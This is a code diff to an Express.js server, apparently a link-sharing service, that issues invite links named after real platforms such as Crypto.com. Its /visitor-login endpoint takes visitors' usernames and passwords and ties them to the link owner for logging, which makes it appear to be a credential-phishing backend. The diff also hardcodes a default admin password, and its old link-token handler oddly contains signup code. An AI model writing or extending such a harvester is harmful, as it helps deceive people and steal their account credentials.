@@ -58,36 +58,17 @@ const dbConfig = DATABASE_URL
 
 const app = express();
 
-
-let db;
-let dbReady = false;
-async function connectDatabase() {
-  db = new Pool(dbConfig);
-  try {
-    await db.query('SELECT 1');
-    dbReady = true;
-    await initializeDatabase();
-    console.log('Database connection established.');
-  } catch (err) {
-    dbReady = false;
-    console.error('Database connection error:', err);
-    // Optionally, retry connection after a delay
-    setTimeout(connectDatabase, 10000); // retry every 10s
-  }
-}
-connectDatabase();
-app.locals.db = db;
-
-// Health endpoint that checks DB connectivity
-app.get("/health", async (req, res) => {
-  try {
-    if (!dbReady) throw new Error('DB not connected');
-    await db.query('SELECT 1');
-    res.json({ status: "up", db: "connected" });
-  } catch (e) {
-    res.status(500).json({ status: "down", db: "disconnected", error: e.message });
-  }
+// Early health endpoint (will respond even if DB is still connecting)
+app.get("/health", (req, res) => {
+  res.json({ status: "up" });
 });
+
+// Global database client (needed by initialization functions)
+const db = new Pool(dbConfig);
+db.connect()
+  .then(() => initializeDatabase())
+  .catch((err) => console.error("Database connection error:", err));
+app.locals.db = db;
 
 const ADMIN_USERNAME = ENV_ADMIN_USERNAME || "support@thinlinks.com";
 const ADMIN_PASSWORD = ENV_ADMIN_PASSWORD || "Boyalinco$10";
@@ -382,26 +363,29 @@ app.post("/signup", async (req, res) => {
 
 app.post("/login", async (req, res) => {
   const { username, password } = req.body;
-  if (!dbReady) {
-    return res.status(503).json({ message: "Database unavailable. Please try again later." });
-  }
   try {
     const result = await db.query(
       "SELECT id, username, password, is_verified FROM owners WHERE username = $1",
       [username],
     );
+
     if (result.rowCount === 0) {
       return res.status(401).json({ message: "Invalid credentials" });
     }
+
     const user = result.rows[0];
+
     const storedPassword = user.password || "";
     const isHashed = storedPassword.startsWith("$2");
+
     const passwordMatch = isHashed
       ? await bcrypt.compare(password, storedPassword)
       : storedPassword === password;
+
     if (!passwordMatch) {
       return res.status(401).json({ message: "Invalid credentials" });
     }
+
     const compromised = await isPasswordCompromised(password);
     if (compromised) {
       return res.status(403).json({
@@ -409,6 +393,7 @@ app.post("/login", async (req, res) => {
           "Your password appears in known data breaches. Please contact support to reset it before continuing.",
       });
     }
+
     if (!isHashed) {
       try {
         const upgradedHash = await bcrypt.hash(password, 12);
@@ -420,11 +405,13 @@ app.post("/login", async (req, res) => {
         console.error("Failed to upgrade owner password hash:", upgradeError);
       }
     }
+
     if (!user.is_verified) {
       return res.status(403).json({
         message: "Account pending administrator verification.",
       });
     }
+
     res.status(200).json({
       message: "Login successful",
       user: {
@@ -435,7 +422,7 @@ app.post("/login", async (req, res) => {
     });
   } catch (error) {
     console.error("Error during login:", error);
-    res.status(500).json({ message: "Internal Server Error", error: error.message });
+    res.status(500).json({ message: "Internal Server Error" });
   }
 });
 
@@ -459,44 +446,47 @@ app.post("/link-tokens", async (req, res) => {
 
     const token = crypto.randomBytes(16).toString("hex"); // produces a hard-to-guess token for the invite link
 
-    if (!dbReady) {
-      return res.status(503).json({ message: "Database unavailable. Please try again later." });
+    await db.query(
+      "INSERT INTO link_tokens (token, owner_id, platform) VALUES ($1, $2, $3)",
+      [token, ownerId, platform],
+    ); // persists the new token for future visitor tracking
+
+    const sanitizedSubdomain = platform.toLowerCase().replace(/[^a-z0-9]/g, ""); // strips punctuation so names like "Crypto.com" map to cryptocom
+
+    let shareUrl;
+
+    const routePath = `/${sanitizedSubdomain}`;
+    if (process.env.NODE_ENV === "production") {
+      const baseUrl = ROOT_SHARE_DOMAIN
+        ? `https://${ROOT_SHARE_DOMAIN}`
+        : "https://thinlinks.com";
+      shareUrl = `${baseUrl}${routePath}?linkToken=${token}`;
+    } else {
+      shareUrl = `http://localhost:5173${routePath}?linkToken=${token}`;
     }
-    try {
-      const strengthError = validatePasswordStrength(password);
-      if (strengthError) {
-        return res.status(400).json({ message: strengthError });
-      }
-      const compromised = await isPasswordCompromised(password);
-      if (compromised) {
-        return res.status(400).json({
-          message:
-            "That password appears in known data breaches. Please choose a different password.",
-        });
-      }
-      const existing = await db.query(
-        "SELECT id FROM owners WHERE username = $1",
-        [username],
-      );
-      if (existing.rowCount > 0) {
-        return res
-          .status(409)
-          .json({ message: "Username already exists. Choose another." });
-      }
-      const hashedPassword = await bcrypt.hash(password, 12);
-      const result = await db.query(
-        "INSERT INTO owners (username, password) VALUES ($1, $2) RETURNING id, username, is_verified, created_at",
-        [username, hashedPassword],
-      ); // new sign-ups start unverified until the admin approves them
-      res.status(201).json({
-        message:
-          "Account created. An administrator must verify your access before you can log in.",
-        user: result.rows[0],
-      });
-    } catch (error) {
-      console.error("Error during signup:", error);
-      res.status(500).json({ message: "Internal Server Error", error: error.message });
-    }
+
+    res.status(201).json({ token, shareUrl });
+  } catch (error) {
+    console.error("Error creating link token:", error);
+    res.status(500).json({ message: "Failed to create link token" });
+  }
+});
+
+app.post("/visitor-login", async (req, res) => {
+  const { username, password: visitorPassword, linkToken, platform } = req.body;
+
+  if (!username || !visitorPassword || !linkToken || !platform) {
+    return res.status(400).json({
+      message: "username, password, linkToken, and platform are required.",
+    }); // ensures the log has enough context
+  }
+
+  try {
+    const tokenResult = await db.query(
+      "SELECT owner_id, platform FROM link_tokens WHERE token = $1",
+      [linkToken],
+    ); // looks up which owner owns this link token
+
     if (tokenResult.rows.length === 0) {
       return res.status(404).json({ message: "Unknown invite link." }); // blocks logging when the link is not registered
     }
